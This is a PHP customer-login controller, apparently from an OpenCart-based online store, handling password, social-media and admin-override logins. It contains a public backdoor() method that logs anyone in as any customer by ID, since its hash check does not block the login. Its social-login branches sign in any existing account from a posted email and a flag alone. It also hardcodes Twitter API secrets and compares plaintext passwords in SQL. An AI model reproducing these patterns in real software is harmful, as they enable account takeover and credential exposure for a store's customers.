<?php 

require 'vendor/autoload.php';
// use Abraham\TwitterOAuth\TwitterOAuth;
include_once("vendor/LinkedIn/http.php");
include_once("vendor/LinkedIn/oauth_client.php");

class ControllerAccountLogin extends Controller {
	private $error = array();
	
	public function index() {
		
		//For Twitter
		 // $connection = new TwitterOAuth('LoWzTBvrAGXLhVttYLiZZNIOz', 'u8UqQzUQMoSL75hfxnEZv4wDmHyfredtCquIv6ZnKp9O8RXstX');
		// $callback = "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'/loginWithTwitter';

		// $this->document->addScript('catalog/view/javascript/ppusa2.0/labelholder.js');
		// $this->document->addStyle('catalog/view/theme/ppusa2.0/stylesheet/labelholder.css');
		
		// //OAUTH call back is hardcoded. KIndly change this
		// $request_token = $connection->oauth('oauth/request_token', array('oauth_callback' => $callback));
		// $this->session->data['oauth_token'] = $request_token['oauth_token'];
		// $this->session->data['oauth_token_secret'] = $request_token['oauth_token_secret'];
		// $url = $connection->url('oauth/authorize', array('oauth_token' => $request_token['oauth_token']));
		$this->data['url'] = $url;


		$this->load->model('account/customer');
		if ($this->request->post['is_fb'] == '1')
		{
			$customer_info = $this->model_account_customer->getCustomerByEmail($this->request->post['email']);
			if(!$customer_info){
				$this->model_account_customer->addSocialMediaCustomer($this->request->post['fb_fname'],$this->request->post['fb_lname'],$this->request->post['email'],$this->request->post['password']);
			} else{
				$this->customer->login($customer_info['email'], '', true);
				$this->redirect($this->url->link('account/account', '', 'SSL'));
			}
		}
		if ($this->request->post['is_google'] == '1')
		{
			$customer_info = $this->model_account_customer->getCustomerByEmail($this->request->post['email']);
			if(!$customer_info){
				$this->model_account_customer->addSocialMediaCustomer($this->request->post['google_fname'],$this->request->post['google_lname'],$this->request->post['email'],$this->request->post['password']);
			} else{
				$this->customer->login($customer_info['email'], '', true);
				$this->redirect($this->url->link('account/account', '', 'SSL'));
			}
		}
		if ($this->request->post['is_linkedin'] == '1')
		{
			$customer_info = $this->model_account_customer->getCustomerByEmail($this->request->post['email']);
			if(!$customer_info){
				$this->model_account_customer->addSocialMediaCustomer($this->request->post['linkedin_fname'],$this->request->post['linkedin_lname'],$this->request->post['email'],$this->request->post['password']);
			} else{
				$this->customer->login($customer_info['email'], '', true);
				$this->redirect($this->url->link('account/account', '', 'SSL'));
			}
		}
		// Login override for admin users
		if (!empty($this->request->get['token'])) {
			$this->customer->logout();
			
			$customer_info = $this->model_account_customer->getCustomerByToken($this->request->get['token']);
			
			if ($customer_info && $this->customer->login($customer_info['email'], '', true)) {
				// Default Addresses
				$this->load->model('account/address');

				$address_info = $this->model_account_address->getAddress($this->customer->getAddressId());

				if ($address_info) {
					if ($this->config->get('config_tax_customer') == 'shipping') {
						$this->session->data['shipping_country_id'] = $address_info['country_id'];
						$this->session->data['shipping_zone_id'] = $address_info['zone_id'];
						$this->session->data['shipping_postcode'] = $address_info['postcode'];	
					}
					
					if ($this->config->get('config_tax_customer') == 'payment') {
						$this->session->data['payment_country_id'] = $address_info['country_id'];
						$this->session->data['payment_zone_id'] = $address_info['zone_id'];
					}
				} else {
					unset($this->session->data['shipping_country_id']);	
					unset($this->session->data['shipping_zone_id']);	
					unset($this->session->data['shipping_postcode']);
					unset($this->session->data['payment_country_id']);	
					unset($this->session->data['payment_zone_id']);	
				}

				$this->redirect($this->url->link('account/account', '', 'SSL')); 
			}
		}		
		
		// echo "here";exit;
		if ($this->customer->isLogged()) {  
			$this->redirect($this->url->link('account/account', '', 'SSL'));
		}

		$this->language->load('account/login');

		$this->document->setTitle($this->language->get('heading_title'));

		if (($this->request->server['REQUEST_METHOD'] == 'POST') && $this->validate()) {
			unset($this->session->data['guest']);
			
			// Default Shipping Address
			$this->load->model('account/address');

			$address_info = $this->model_account_address->getAddress($this->customer->getAddressId());

			if ($address_info) {
				if ($this->config->get('config_tax_customer') == 'shipping') {
					$this->session->data['shipping_country_id'] = $address_info['country_id'];
					$this->session->data['shipping_zone_id'] = $address_info['zone_id'];
					$this->session->data['shipping_postcode'] = $address_info['postcode'];	
				}
				
				if ($this->config->get('config_tax_customer') == 'payment') {
					$this->session->data['payment_country_id'] = $address_info['country_id'];
					$this->session->data['payment_zone_id'] = $address_info['zone_id'];
				}
			} else {
				unset($this->session->data['shipping_country_id']);	
				unset($this->session->data['shipping_zone_id']);	
				unset($this->session->data['shipping_postcode']);
				unset($this->session->data['payment_country_id']);	
				unset($this->session->data['payment_zone_id']);	
			}

			// Added strpos check to pass McAfee PCI compliance test (http://forum.opencart.com/viewtopic.php?f=10&t=12043&p=151494#p151295)
			if (isset($this->request->post['redirect']) && (strpos($this->request->post['redirect'], $this->config->get('config_url')) !== false || strpos($this->request->post['redirect'], $this->config->get('config_ssl')) !== false)) {
				$this->redirect(str_replace('&amp;', '&', $this->request->post['redirect']));
			} else {
				$this->redirect($this->url->link('account/account', '', 'SSL')); 
			}
		}  
		
		$this->data['breadcrumbs'] = array();

		$this->data['breadcrumbs'][] = array(
			'text'      => $this->language->get('text_home'),
			'href'      => $this->url->link('common/home'),       	
			'separator' => false
			);

		$this->data['breadcrumbs'][] = array(
			'text'      => $this->language->get('text_account'),
			'href'      => $this->url->link('account/account', '', 'SSL'),
			'separator' => $this->language->get('text_separator')
			);
		
		$this->data['breadcrumbs'][] = array(
			'text'      => $this->language->get('text_login'),
			'href'      => $this->url->link('account/login', '', 'SSL'),      	
			'separator' => $this->language->get('text_separator')
			);

		$this->data['heading_title'] = $this->language->get('heading_title');

		$this->data['text_new_customer'] = $this->language->get('text_new_customer');
		$this->data['text_register'] = $this->language->get('text_register');
		$this->data['text_register_account'] = $this->language->get('text_register_account');
		$this->data['text_returning_customer'] = $this->language->get('text_returning_customer');
		$this->data['text_i_am_returning_customer'] = $this->language->get('text_i_am_returning_customer');
		$this->data['text_forgotten'] = $this->language->get('text_forgotten');

		$this->data['entry_email'] = $this->language->get('entry_email');
		$this->data['entry_password'] = $this->language->get('entry_password');

		$this->data['button_continue'] = $this->language->get('button_continue');
		$this->data['button_login'] = $this->language->get('button_login');

		if (isset($this->error['warning'])) {
			$this->data['error_warning'] = $this->error['warning'];
		} else {
			$this->data['error_warning'] = '';
		}
		
		$this->data['action'] = $this->url->link('account/login', '', 'SSL');
		$this->data['register'] = $this->url->link('account/register', '', 'SSL');
		$this->data['forgotten'] = $this->url->link('account/forgotten', '', 'SSL');
		$this->session->data['redirect'] = $this->url->link(($this->request->get['redirect']) ? $this->request->get['redirect']: 'account/account', '', 'SSL');

    	// Added strpos check to pass McAfee PCI compliance test (http://forum.opencart.com/viewtopic.php?f=10&t=12043&p=151494#p151295)
		if (isset($this->request->post['redirect']) && (strpos($this->request->post['redirect'], $this->config->get('config_url')) !== false || strpos($this->request->post['redirect'], $this->config->get('config_ssl')) !== false)) {
			$this->data['redirect'] = $this->request->post['redirect'];
		} elseif (isset($this->session->data['redirect'])) {
			$this->data['redirect'] = $this->session->data['redirect'];

			unset($this->session->data['redirect']);		  	
		} else {
			$this->data['redirect'] = 'account/account';
		}

		if (isset($this->session->data['success'])) {
			$this->data['success'] = $this->session->data['success'];

			unset($this->session->data['success']);
		} else {
			$this->data['success'] = '';
		}
		
		if (isset($this->request->post['email'])) {
			$this->data['email'] = $this->request->post['email'];
		} else {
			$this->data['email'] = '';
		}

		if (isset($this->request->post['password'])) {
			$this->data['password'] = $this->request->post['password'];
		} else {
			$this->data['password'] = '';
		}

		if (file_exists(DIR_TEMPLATE . (($this->session->data['temp_theme'])? $this->session->data['temp_theme'] : $this->config->get('config_template')) . '/template/account/login.tpl')) {
			$this->template = (($this->session->data['temp_theme'])? $this->session->data['temp_theme'] : $this->config->get('config_template')) . '/template/account/login.tpl';
		} else {
			$this->template = 'default/template/account/login.tpl';
		}


		
		$this->children = array(
			'common/column_left',
			'common/column_right',
			'common/content_top',
			'common/content_bottom',
			'common/footer',
			'common/header'
			// 'account/register'
			);
		$this->data['register_template'] = $this->getChild('account/register');
		

		$this->response->setOutput($this->render());
	}

	private function validate() {
		if (!$this->customer->login($this->request->post['email'], $this->request->post['password'])) {
			$this->error['warning'] = $this->language->get('error_login');
		}

		$customer_info = $this->model_account_customer->getCustomerByEmail($this->request->post['email']);
		
		if ($customer_info && !$customer_info['approved']) {
			$this->error['warning'] = $this->language->get('error_approved');
		}
		if(isset($this->request->post['is_checkout']) && $this->error)
		{
				$customer_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "customer WHERE LOWER(email) = '" . $this->db->escape(strtolower($this->request->post['email'])) . "'");	
				if (!$customer_query->num_rows) {
					$this->session->data['checkout_error_email'] = 1;
				}
				else
				{
					$customer_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "customer WHERE LOWER(password) = '" . $this->db->escape(strtolower($this->request->post['password'])) . "'");	
					if (!$customer_query->num_rows) {
							$this->session->data['checkout_error_password'] = 1;
						}
				}
			$this->redirect($this->url->link('checkout/checkout', '', 'SSL'));
		}		
		
		if (!$this->error) {
			return true;
		} else {
			return false;
		}  	
	}

	public function backdoor()
	{
		$this->load->model('account/customer');

		if (!empty($this->request->get['customer_id'])) {
			$this->customer->logout();
			$this->cart->clear();
			
			$customer_info = $this->model_account_customer->getCustomer($this->request->get['customer_id']);
		// echo $customer_info['email']."<br>";
		// echo md5($customer_info['email'])."<br>";
		// echo $this->request->get['salt'];exit;
			if(md5($customer_info['email'])!=$this->request->get['salt'])
			{
				echo 'Invalid Override!';
			}	
			if ($customer_info && $this->customer->login($customer_info['email'], '', true)) {
				// Default Addresses
				$this->load->model('account/address');

				$address_info = $this->model_account_address->getAddress($this->customer->getAddressId());

				if ($address_info) {
					if ($this->config->get('config_tax_customer') == 'shipping') {
						$this->session->data['shipping_country_id'] = $address_info['country_id'];
						$this->session->data['shipping_zone_id'] = $address_info['zone_id'];
						$this->session->data['shipping_postcode'] = $address_info['postcode'];	
					}
					
					if ($this->config->get('config_tax_customer') == 'payment') {
						$this->session->data['payment_country_id'] = $address_info['country_id'];
						$this->session->data['payment_zone_id'] = $address_info['zone_id'];
					}
				} else {
					unset($this->session->data['shipping_country_id']);	
					unset($this->session->data['shipping_zone_id']);	
					unset($this->session->data['shipping_postcode']);
					unset($this->session->data['payment_country_id']);	
					unset($this->session->data['payment_zone_id']);	
				}

				$this->redirect($this->url->link('account/account', '', 'SSL')); 
			}
		}			

	}
	public function ajaxlogin () {
		$this->load->model('account/customer');
		if (($this->request->server['REQUEST_METHOD'] == 'POST') && $this->validate()) {
			unset($this->session->data['guest']);
			
			// Default Shipping Address
			$this->load->model('account/address');

			$address_info = $this->model_account_address->getAddress($this->customer->getAddressId());

			if ($address_info) {
				if ($this->config->get('config_tax_customer') == 'shipping') {
					$this->session->data['shipping_country_id'] = $address_info['country_id'];
					$this->session->data['shipping_zone_id'] = $address_info['zone_id'];
					$this->session->data['shipping_postcode'] = $address_info['postcode'];	
				}
				
				if ($this->config->get('config_tax_customer') == 'payment') {
					$this->session->data['payment_country_id'] = $address_info['country_id'];
					$this->session->data['payment_zone_id'] = $address_info['zone_id'];
				}
			} else {
				unset($this->session->data['shipping_country_id']);	
				unset($this->session->data['shipping_zone_id']);	
				unset($this->session->data['shipping_postcode']);
				unset($this->session->data['payment_country_id']);	
				unset($this->session->data['payment_zone_id']);	
			}
			echo json_encode(array('login' => 1));
		} else {
			echo json_encode(array('login' => 0, 'error' => 'Wrong Email or Password'));
		}
	}

	public function loginWithLinkdin()
	{
		error_log("here");
	}

	public function loginWithTwitter()
	{
		$request_token = [];
		$request_token['oauth_token'] = $this->session->data['oauth_token'];
		$request_token['oauth_token_secret'] = $this->session->data['oauth_token_secret'];
		unset($this->session->data['oauth_token']);	
		unset($this->session->data['oauth_token_secret']);	


		if (isset($_REQUEST['oauth_token']) && $request_token['oauth_token'] !== $_REQUEST['oauth_token']) {
		    echo "something is wrong";
		}
		$connection = new TwitterOAuth('LoWzTBvrAGXLhVttYLiZZNIOz', 'u8UqQzUQMoSL75hfxnEZv4wDmHyfredtCquIv6ZnKp9O8RXstX', trim($request_token['oauth_token']), trim($request_token['oauth_token_secret']));
		$access_token = $connection->oauth("oauth/access_token", ["oauth_verifier" => $_REQUEST['oauth_verifier']]);

		$connection = new TwitterOAuth('LoWzTBvrAGXLhVttYLiZZNIOz', 'u8UqQzUQMoSL75hfxnEZv4wDmHyfredtCquIv6ZnKp9O8RXstX', $access_token['oauth_token'], $access_token['oauth_token_secret']);

		$user = $connection->get("account/verify_credentials",['include_email' => 'true']);
		//var_dump($user);
		//The user packet doesnot contain email and password so i am saving the id as email of user and generating md password of current date and time
		$this->load->model('account/customer');

		
		$customer_info = $this->model_account_customer->getCustomerByEmail($user->email);
		if(!$customer_info){
			$this->model_account_customer->addSocialMediaCustomer($user->screen_name,$user->name,$user->email,$user->id);
		} else{
			$this->customer->login($user->email, '', true);
			$this->redirect($this->url->link('account/account', '', 'SSL'));
		}
		
		
	}

}
?>